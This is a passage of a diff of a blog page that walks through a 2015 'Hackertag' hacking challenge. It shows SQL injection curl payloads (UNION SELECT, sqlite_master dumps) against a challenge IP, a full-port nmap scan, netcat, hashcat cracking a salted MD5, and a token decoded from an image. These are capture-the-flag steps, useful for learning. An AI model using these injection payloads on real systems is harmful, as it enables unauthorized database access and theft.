+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#a61717;background-color:#e3d2d2">!</span>curl <span style="color:#ed9d13">&#34;http://82.195.79.41/liste.php?id=1&#39;&#34;</span> <span style="color:#3677a9">2</span>&gt; /dev/null | tail -n <span style="color:#3677a9">1</span>
 </code></pre></div><pre><code>&lt;div id=&quot;contentliquid&quot;&gt;&lt;div id=&quot;content&quot;&gt;unrecognized token: &quot;'1'';&quot;
-</code></pre><p>Aha.. Ok. Let&rsquo;s try again:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#a61717;background-color:#e3d2d2>!</span>curl <span style=color:#ed9d13>&#34;http://82.195.79.41/liste.php?id=1&#39;%20OR 1=1&#34;</span> <span style=color:#3677a9>2</span>&gt; /dev/null | tail -n <span style=color:#3677a9>1</span>
+</code></pre>
+<p>Aha.. Ok. Let&rsquo;s try again:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#a61717;background-color:#e3d2d2">!</span>curl <span style="color:#ed9d13">&#34;http://82.195.79.41/liste.php?id=1&#39;%20OR 1=1&#34;</span> <span style="color:#3677a9">2</span>&gt; /dev/null | tail -n <span style="color:#3677a9">1</span>
 </code></pre></div><pre><code>&lt;div id=&quot;contentliquid&quot;&gt;&lt;div id=&quot;content&quot;&gt;unrecognized token: &quot;';&quot;
-</code></pre><p>What about the next one?</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#a61717;background-color:#e3d2d2>!</span>curl <span style=color:#ed9d13>&#34;http://82.195.79.41/liste.php?id=NULL&#39;%20UNION%20ALL%20SELECT%20&#39;a&#39;,&#39;k&#39;;--#&#34;</span> <span style=color:#3677a9>2</span>&gt; /dev/null | tail -n <span style=color:#3677a9>20</span>
+</code></pre>
+<p>What about the next one?</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#a61717;background-color:#e3d2d2">!</span>curl <span style="color:#ed9d13">&#34;http://82.195.79.41/liste.php?id=NULL&#39;%20UNION%20ALL%20SELECT%20&#39;a&#39;,&#39;k&#39;;--#&#34;</span> <span style="color:#3677a9">2</span>&gt; /dev/null | tail -n <span style="color:#3677a9">20</span>
 </code></pre></div><pre><code>&lt;div id=&quot;contentliquid&quot;&gt;&lt;div id=&quot;content&quot;&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;/liste.php?id=a&quot;&gt;k&lt;/a&gt;&lt;ul&gt;&lt;/div&gt;&lt;/div&gt;
         &lt;div id=&quot;leftcolumn&quot;&gt;
     &lt;ul&gt;
@@ -161,20 +288,42 @@ binascii.unhexlify(hex_code)
     &lt;/div&gt;
 &lt;/body&gt;
 &lt;/html&gt;
-</code></pre><p>Have you noticed this line?</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>&lt;div id=&#34;contentliquid&#34;&gt;&lt;div id=&#34;content&#34;&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&#34;/liste.php?id=a&#34;&gt;k&lt;/a&gt;&lt;ul&gt;&lt;/div&gt;&lt;/div&gt;
-</code></pre></div><p><strong>a</strong> and <strong>b</strong> were successfully &ldquo;merged&rdquo; into the results. Now the biggest problem I had was the fingerprinting of the DB itself. OWASP has <a href=https://www.owasp.org/index.php/OWASP_Backend_Security_Project_DBMS_Fingerprint#Fingerprinting_through_SQL_Dialect_Injection>sth</a> you can use in your tests. But the most useful thing is to test for <em>string concatenation</em> (nice article <a href=http://digitizor.com/2009/03/27/sql-injection-2-fingerprinting/>here</a>). So I&rsquo;ve tried several things:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#a61717;background-color:#e3d2d2>!</span>curl <span style=color:#ed9d13>&#34;http://82.195.79.41/liste.php?id=NULL&#39;%20UNION%20ALL%20SELECT%20CONCAT(&#39;a&#39;, &#39;b&#39;),&#39;k&#39;;--#&#34;</span> <span style=color:#3677a9>2</span>&gt; /dev/null | grep <span style=color:#ed9d13>&#34;contentliquid&#34;</span>
+</code></pre>
+<p>Have you noticed this line?</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&lt;div id=&#34;contentliquid&#34;&gt;&lt;div id=&#34;content&#34;&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&#34;/liste.php?id=a&#34;&gt;k&lt;/a&gt;&lt;ul&gt;&lt;/div&gt;&lt;/div&gt;
+</code></pre></div><p><strong>a</strong> and <strong>b</strong> were successfully &ldquo;merged&rdquo; into the results. Now the biggest problem I had was the fingerprinting of the DB itself. OWASP has <a href="https://www.owasp.org/index.php/OWASP_Backend_Security_Project_DBMS_Fingerprint#Fingerprinting_through_SQL_Dialect_Injection">sth</a> you can use in your tests. But the most useful thing is to test for <em>string concatenation</em> (nice article <a href="http://digitizor.com/2009/03/27/sql-injection-2-fingerprinting/">here</a>). So I&rsquo;ve tried several things:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#a61717;background-color:#e3d2d2">!</span>curl <span style="color:#ed9d13">&#34;http://82.195.79.41/liste.php?id=NULL&#39;%20UNION%20ALL%20SELECT%20CONCAT(&#39;a&#39;, &#39;b&#39;),&#39;k&#39;;--#&#34;</span> <span style="color:#3677a9">2</span>&gt; /dev/null | grep <span style="color:#ed9d13">&#34;contentliquid&#34;</span>
 </code></pre></div><pre><code>&lt;div id=&quot;contentliquid&quot;&gt;&lt;div id=&quot;content&quot;&gt;unrecognized token: &quot;';&quot;
-</code></pre><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#a61717;background-color:#e3d2d2>!</span>curl <span style=color:#ed9d13>&#34;http://82.195.79.41/liste.php?id=NULL&#39;%20UNION%20ALL%20SELECT%20&#39;a&#39;+&#39;b&#39;,&#39;k&#39;;--#&#34;</span> <span style=color:#3677a9>2</span>&gt; /dev/null | grep <span style=color:#ed9d13>&#34;contentliquid&#34;</span>
+</code></pre>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#a61717;background-color:#e3d2d2">!</span>curl <span style="color:#ed9d13">&#34;http://82.195.79.41/liste.php?id=NULL&#39;%20UNION%20ALL%20SELECT%20&#39;a&#39;+&#39;b&#39;,&#39;k&#39;;--#&#34;</span> <span style="color:#3677a9">2</span>&gt; /dev/null | grep <span style="color:#ed9d13">&#34;contentliquid&#34;</span>
 </code></pre></div><pre><code>&lt;div id=&quot;contentliquid&quot;&gt;&lt;div id=&quot;content&quot;&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;/liste.php?id=a&quot;&gt;k&lt;/a&gt;&lt;ul&gt;&lt;/div&gt;&lt;/div&gt;
-</code></pre><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#a61717;background-color:#e3d2d2>!</span>curl <span style=color:#ed9d13>&#34;http://82.195.79.41/liste.php?id=NULL&#39;%20UNION%20ALL%20SELECT%20&#39;a&#39;||&#39;b&#39;,&#39;k&#39;;--#&#34;</span> <span style=color:#3677a9>2</span>&gt; /dev/null | grep <span style=color:#ed9d13>&#34;contentliquid&#34;</span>
+</code></pre>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#a61717;background-color:#e3d2d2">!</span>curl <span style="color:#ed9d13">&#34;http://82.195.79.41/liste.php?id=NULL&#39;%20UNION%20ALL%20SELECT%20&#39;a&#39;||&#39;b&#39;,&#39;k&#39;;--#&#34;</span> <span style="color:#3677a9">2</span>&gt; /dev/null | grep <span style="color:#ed9d13">&#34;contentliquid&#34;</span>
 </code></pre></div><pre><code>&lt;div id=&quot;contentliquid&quot;&gt;&lt;div id=&quot;content&quot;&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;/liste.php?id=ab&quot;&gt;k&lt;/a&gt;&lt;ul&gt;&lt;/div&gt;&lt;/div&gt;
-</code></pre><p>Well <code>'a'||'b'</code> seemed to work. That syntax is <em>Oracle</em> specific. But also <em>SQLite</em> specific. And this was my biggest mistake: I was searching for Oracle specific injections, but the DBMS was in fact SQLite. Finally I&rsquo;ve constructed this query:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#a61717;background-color:#e3d2d2>!</span>curl <span style=color:#ed9d13>&#34;http://82.195.79.41/liste.php?id=NULL&#39;%20UNION%20ALL%20SELECT%20&#39;a&#39;,name</span><span style=color:#ed9d13>%20F</span><span style=color:#ed9d13>ROM</span><span style=color:#ed9d13>%20s</span><span style=color:#ed9d13>qlite_master;--#&#34;</span> <span style=color:#3677a9>2</span>&gt; /dev/null | grep <span style=color:#ed9d13>&#34;contentliquid&#34;</span>
+</code></pre>
+<p>Well <code>'a'||'b'</code> seemed to work. That syntax is <em>Oracle</em> specific. But also <em>SQLite</em> specific. And this was my biggest mistake: I was searching for Oracle specific injections, but the DBMS was in fact SQLite. Finally I&rsquo;ve constructed this query:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#a61717;background-color:#e3d2d2">!</span>curl <span style="color:#ed9d13">&#34;http://82.195.79.41/liste.php?id=NULL&#39;%20UNION%20ALL%20SELECT%20&#39;a&#39;,name</span><span style="color:#ed9d13">%20F</span><span style="color:#ed9d13">ROM</span><span style="color:#ed9d13">%20s</span><span style="color:#ed9d13">qlite_master;--#&#34;</span> <span style="color:#3677a9">2</span>&gt; /dev/null | grep <span style="color:#ed9d13">&#34;contentliquid&#34;</span>
 </code></pre></div><pre><code>&lt;div id=&quot;contentliquid&quot;&gt;&lt;div id=&quot;content&quot;&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;/liste.php?id=a&quot;&gt;token&lt;/a&gt;&lt;li&gt;&lt;a href=&quot;/liste.php?id=a&quot;&gt;public&lt;/a&gt;&lt;ul&gt;&lt;/div&gt;&lt;/div&gt;
-</code></pre><p>So there are 2 tables available:</p><ul><li>token</li><li>public</li></ul><p>Let&rsquo;s have a look at the schema of <code>token</code>:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#a61717;background-color:#e3d2d2>!</span>curl <span style=color:#ed9d13>&#34;http://82.195.79.41/liste.php?id=NULL&#39;%20UNION%20ALL%20SELECT%20&#39;a&#39;,sql</span><span style=color:#ed9d13>%20F</span><span style=color:#ed9d13>ROM</span><span style=color:#ed9d13>%20s</span><span style=color:#ed9d13>qlite_master%20WHERE%20name=&#39;token&#39;;--#&#34;</span> <span style=color:#3677a9>2</span>&gt; /dev/null | grep <span style=color:#ed9d13>&#34;contentliquid&#34;</span>
+</code></pre>
+<p>So there are 2 tables available:</p>
+<ul>
+<li>token</li>
+<li>public</li>
+</ul>
+<p>Let&rsquo;s have a look at the schema of <code>token</code>:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#a61717;background-color:#e3d2d2">!</span>curl <span style="color:#ed9d13">&#34;http://82.195.79.41/liste.php?id=NULL&#39;%20UNION%20ALL%20SELECT%20&#39;a&#39;,sql</span><span style="color:#ed9d13">%20F</span><span style="color:#ed9d13">ROM</span><span style="color:#ed9d13">%20s</span><span style="color:#ed9d13">qlite_master%20WHERE%20name=&#39;token&#39;;--#&#34;</span> <span style="color:#3677a9">2</span>&gt; /dev/null | grep <span style="color:#ed9d13">&#34;contentliquid&#34;</span>
 </code></pre></div><pre><code>&lt;div id=&quot;contentliquid&quot;&gt;&lt;div id=&quot;content&quot;&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;/liste.php?id=a&quot;&gt;CREATE TABLE token (token_val NUMERIC)&lt;/a&gt;&lt;ul&gt;&lt;/div&gt;&lt;/div&gt;
-</code></pre><p>Ok, now go for it:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#a61717;background-color:#e3d2d2>!</span>curl <span style=color:#ed9d13>&#34;http://82.195.79.41/liste.php?id=NULL&#39;%20UNION%20ALL%20SELECT%20&#39;a&#39;,token_val</span><span style=color:#ed9d13>%20F</span><span style=color:#ed9d13>ROM%20token;--#&#34;</span> <span style=color:#3677a9>2</span>&gt; /dev/null | grep <span style=color:#ed9d13>&#34;contentliquid&#34;</span>
+</code></pre>
+<p>Ok, now go for it:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#a61717;background-color:#e3d2d2">!</span>curl <span style="color:#ed9d13">&#34;http://82.195.79.41/liste.php?id=NULL&#39;%20UNION%20ALL%20SELECT%20&#39;a&#39;,token_val</span><span style="color:#ed9d13">%20F</span><span style="color:#ed9d13">ROM%20token;--#&#34;</span> <span style="color:#3677a9">2</span>&gt; /dev/null | grep <span style="color:#ed9d13">&#34;contentliquid&#34;</span>
 </code></pre></div><pre><code>&lt;div id=&quot;contentliquid&quot;&gt;&lt;div id=&quot;content&quot;&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;/liste.php?id=a&quot;&gt;336809&lt;/a&gt;&lt;ul&gt;&lt;/div&gt;&lt;/div&gt;
-</code></pre><p>Token <strong>336809</strong> is the next one.</p><h2 id=6th-and-last-token>6th and last Token</h2><p>While looking for tokens, I have seen this message a couple of times:</p><p><img src=http://dl.dornea.nu/img/2015/hackertag/08e649ee3231f07d05c42df5c11de2ab.png alt=hackertag></p><p>The realm says: <strong>80 is just a number of 65535</strong>. Ok hat was a hint for more undetected ports. I&rsquo;ve run <em>nmap</em> again:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback># nmap -sT -p 0-65535 82.195.79.41
+</code></pre>
+<p>Token <strong>336809</strong> is the next one.</p>
+<h2 id="6th-and-last-token">6th and last Token</h2>
+<p>While looking for tokens, I have seen this message a couple of times:</p>
+<p><img src="http://dl.dornea.nu/img/2015/hackertag/08e649ee3231f07d05c42df5c11de2ab.png" alt="hackertag"></p>
+<p>The realm says: <strong>80 is just a number of 65535</strong>. Ok hat was a hint for more undetected ports. I&rsquo;ve run <em>nmap</em> again:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># nmap -sT -p 0-65535 82.195.79.41
 ...
 Nmap scan report for 82.195.79.41
 Host is up (0.036s latency).
@@ -185,7 +334,8 @@ PORT     STATE SERVICE
 7777/tcp open  cbt
 
 Nmap done: 1 IP address (1 host up) scanned in 2485.52 seconds
-</code></pre></div><p>OH! What&rsquo;s behind port <strong>4141</strong>?</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#a61717;background-color:#e3d2d2>!</span>nc <span style=color:#3677a9>82.195</span>.<span style=color:#3677a9>79.41</span> <span style=color:#3677a9>4141</span>
+</code></pre></div><p>OH! What&rsquo;s behind port <strong>4141</strong>?</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#a61717;background-color:#e3d2d2">!</span>nc <span style="color:#3677a9">82.195</span>.<span style="color:#3677a9">79.41</span> <span style="color:#3677a9">4141</span>
 </code></pre></div><pre><code>dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddxKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
 dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddxKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWKxc:l0WMMMMMMMMMMMMMM
 dddddddddddddddddddddddxdddddddddddddddddddddddddddddddddddddddddddddddddddddxKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWNWMMMMM0:......o0NMMMMMMMMMMMM
@@ -219,9 +369,12 @@ Der Aufruf war dabei wie folgt: echo -n &quot;Hackertag{Passwort}&quot; | md5sum
 d79a2543ddbb8042a6d14851fb098e0d
 
 *********************************************************
-</code></pre><p><img src=http://dl.dornea.nu/img/2015/hackertag/61fe1a8df134387a58b7790a891c8443.png alt=hackertag></p><p>What it basically says, is that a certain MD5 hash was created using <code>echo -n "Hackertag{Password}"</code>, where <code>Hackertag</code> is a salt. And given the hash I should find out the right password. I have never used <code>hashcat</code> before but this was the right time to do it. After reading some docs, I was able to get the right password in ca. 3 seconds :)</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>%%bash
-<span style=color:#24909d>echo</span> <span style=color:#ed9d13>&#34;d79a2543ddbb8042a6d14851fb098e0d&#34;</span> &gt; <span style=color:#24909d>hash</span>
-hashcat -m <span style=color:#3677a9>0</span> --attack-mode <span style=color:#3677a9>3</span> <span style=color:#24909d>hash</span> <span style=color:#ed9d13>&#39;Hackertag?l?l?l?l?l?l&#39;</span>
+</code></pre>
+<p><img src="http://dl.dornea.nu/img/2015/hackertag/61fe1a8df134387a58b7790a891c8443.png" alt="hackertag"></p>
+<p>What it basically says, is that a certain MD5 hash was created using <code>echo -n &quot;Hackertag{Password}&quot;</code>, where <code>Hackertag</code> is a salt. And given the hash I should find out the right password. I have never used <code>hashcat</code> before but this was the right time to do it. After reading some docs, I was able to get the right password in ca. 3 seconds :)</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
+<span style="color:#24909d">echo</span> <span style="color:#ed9d13">&#34;d79a2543ddbb8042a6d14851fb098e0d&#34;</span> &gt; <span style="color:#24909d">hash</span>
+hashcat -m <span style="color:#3677a9">0</span> --attack-mode <span style="color:#3677a9">3</span> <span style="color:#24909d">hash</span> <span style="color:#ed9d13">&#39;Hackertag?l?l?l?l?l?l&#39;</span>
 </code></pre></div><pre><code>Initializing hashcat v0.49 with 2 threads and 32mb segment-size...
 
 Added hashes from file hash: 1 (1 salts)
@@ -351,17 +504,120 @@ Estimated.: --:--:--:--
 
 Started: Wed Mar 18 21:45:47 2015
 Stopped: Wed Mar 18 21:45:47 2015
-</code></pre><p>We can verify that:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#a61717;background-color:#e3d2d2>!</span>echo -n <span style=color:#ed9d13>&#34;Hackertagblue&#34;</span> | md5sum
+</code></pre>
+<p>We can verify that:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#a61717;background-color:#e3d2d2">!</span>echo -n <span style="color:#ed9d13">&#34;Hackertagblue&#34;</span> | md5sum
 </code></pre></div><pre><code>d79a2543ddbb8042a6d14851fb098e0d  -
-</code></pre><p>Perfect! Now we can use the passwort to access this link: http://82.195.79.41/restricted/index.php. Inside you&rsquo;ll see a image and nothing more:</p><p><img src=http://dl.dornea.nu/img/2015/hackertag/dc0eb3cacc8696cdbaa8604bfb89e25e.png alt=hackertag></p><p>But again let&rsquo;s have a look at the image itself:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>%%bash
+</code></pre>
+<p>Perfect! Now we can use the passwort to access this link: http://82.195.79.41/restricted/index.php. Inside you&rsquo;ll see a image and nothing more:</p>
+<p><img src="http://dl.dornea.nu/img/2015/hackertag/dc0eb3cacc8696cdbaa8604bfb89e25e.png" alt="hackertag"></p>
+<p>But again let&rsquo;s have a look at the image itself:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
 curl --user freddy:blue http://82.195.79.41/restricted/tour.jpg -o tour.jpg 2&gt; /dev/null
-strings tour.jpg | grep <span style=color:#ed9d13>&#34;==&#34;</span>
+strings tour.jpg | grep <span style="color:#ed9d13">&#34;==&#34;</span>
 </code></pre></div><pre><code>VG9rZW46IDU1MTI0Mw==
-</code></pre><p>That looks interesting:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#a61717;background-color:#e3d2d2>!</span>echo <span style=color:#ed9d13>&#34;VG9rZW46IDU1MTI0Mw==&#34;</span> | base64 -d
+</code></pre>
+<p>That looks interesting:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#a61717;background-color:#e3d2d2">!</span>echo <span style="color:#ed9d13">&#34;VG9rZW46IDU1MTI0Mw==&#34;</span> | base64 -d
 </code></pre></div><pre><code>Token: 551243
-</code></pre><p>That&rsquo;s it! :)</p></div></main><div class="tl fixed list-pages lh-copy" id=contents-list></div><div class="pagination tc tr-l db fixed-l bottom-2-l right-2-l mb3 mb0-l"><a id=scroll-to-top class="f6 o-0 link br2 ph2 pv1 mb1 bg-main-color pointer" onclick=topFunction() style="color:#fff;visibility:hidden;display:none;transition:opacity .5s,visibility .5s" title="back to top">back to top</a><br><p class="mb0 mt2"><a href=http://blog.dornea.nu/2015/02/26/the-ios-8.1.3-fiasco/>prev post</a>
-<a href=http://blog.dornea.nu/2015/04/21/coming-back-to-c/c-after-2-years/>next post</a></p></div><footer class="content-width mt0 mt5-l mb4 f6 center ph3 gray tc tl-l"><hr class="dn db-l ml0-l gray w3"><br>Powered by <a href=https://gohugo.io/ target=_blank class="link gray dim">Hugo</a>, based on the <a href=https://github.com/lingxz/er target=_blank class="link gray dim">Er</a> theme.<br></footer><script src=https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js></script><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css><style>.is-active-link::before{background-color:var(--secondary-color)}</style><script type=text/javascript>var prevScrollpos=window.pageYOffset;window.onscroll=function(){var currentScrollPos=window.pageYOffset;if(document.getElementById("tag-cloud")!==null){if(prevScrollpos>currentScrollPos){document.getElementById("tag-cloud").style.visibility="visible";document.getElementById("tag-cloud").style.opacity="1";}else{document.getElementById("tag-cloud").style.visibility="hidden";document.getElementById("tag-cloud").style.opacity="0";}}
-if(document.body.scrollTop>1000||document.documentElement.scrollTop>1000){document.getElementById("scroll-to-top").style.display="inline";document.getElementById("scroll-to-top").style.visibility="visible";document.getElementById("scroll-to-top").style.opacity="1";}else{document.getElementById("scroll-to-top").style.visibility="hidden";document.getElementById("scroll-to-top").style.opacity="0";}
-prevScrollpos=currentScrollPos;}
-function topFunction(){document.body.scrollTop=0;document.documentElement.scrollTop=0;}
-if(document.getElementById("contents-list")!==null&&document.getElementsByClassName("post-content").length!==0){tocbot.init({tocSelector:'#contents-list',contentSelector:'.post-content',headingSelector:'h1, h2, h3',});}</script></body></html>
+</code></pre>
+<p>That&rsquo;s it! :)</p>
+</div>
+</main>
+ 
+
+
+
+
+
+
+<div class="tl fixed list-pages lh-copy" id="contents-list"></div>
+
+
+
+<div class="pagination tc tr-l db fixed-l bottom-2-l right-2-l mb3 mb0-l">
+  
+<a id="scroll-to-top" class="f6 o-0 link br2 ph2 pv1 mb1 bg-main-color pointer" onclick="topFunction()" style="color: #fff; visibility: hidden; display: none; transition: opacity .5s, visibility .5s;" title="back to top">back to top</a>
+<br>
+  <p class="mb0 mt2">
+  <a href="http://blog.dornea.nu/2015/02/26/the-ios-8.1.3-fiasco/">prev post</a>
+  <a href="http://blog.dornea.nu/2015/04/21/coming-back-to-c/c-after-2-years/">next post</a>
+  </p>
+</div>
+
+  <footer class="content-width mt0 mt5-l mb4 f6 center ph3 gray tc tl-l">
+  <hr class="dn db-l ml0-l gray w3"><br>
+  Powered by <a href="https://gohugo.io/" target="_blank" class="link gray dim">Hugo</a>, based on the <a href="https://github.com/lingxz/er" target="_blank" class="link gray dim">Er</a> theme. <br>
+  
+</footer>
+  
+
+
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+<style>.is-active-link::before { background-color: var(--secondary-color); }</style>
+
+
+
+
+<script type="text/javascript">
+var prevScrollpos = window.pageYOffset;
+window.onscroll = function() {
+  var currentScrollPos = window.pageYOffset;
+
+  
+  if (document.getElementById("tag-cloud") !== null) { 
+    if (prevScrollpos > currentScrollPos) { 
+      document.getElementById("tag-cloud").style.visibility = "visible";
+      document.getElementById("tag-cloud").style.opacity = "1";
+    } else {
+      document.getElementById("tag-cloud").style.visibility = "hidden";
+      document.getElementById("tag-cloud").style.opacity = "0";
+    }
+  }
+  
+
+  
+  if (document.body.scrollTop > 1000 || document.documentElement.scrollTop > 1000) {
+      document.getElementById("scroll-to-top").style.display = "inline";
+      document.getElementById("scroll-to-top").style.visibility = "visible";
+      document.getElementById("scroll-to-top").style.opacity = "1";
+  } else {
+      document.getElementById("scroll-to-top").style.visibility = "hidden";
+      document.getElementById("scroll-to-top").style.opacity = "0";
+  }
+  
+  prevScrollpos = currentScrollPos;
+}
+
+
+function topFunction() {
+  document.body.scrollTop = 0; 
+  document.documentElement.scrollTop = 0; 
+}
+
+
+
+
+
+
+if (document.getElementById("contents-list") !== null && document.getElementsByClassName("post-content").length !== 0) { 
+  tocbot.init({
+    
+    tocSelector: '#contents-list',
+    
+    contentSelector: '.post-content',
+    
+    headingSelector: 'h1, h2, h3',
+  });
+}
+
+
+</script>
+
+
+
+
+</body>
+</html>
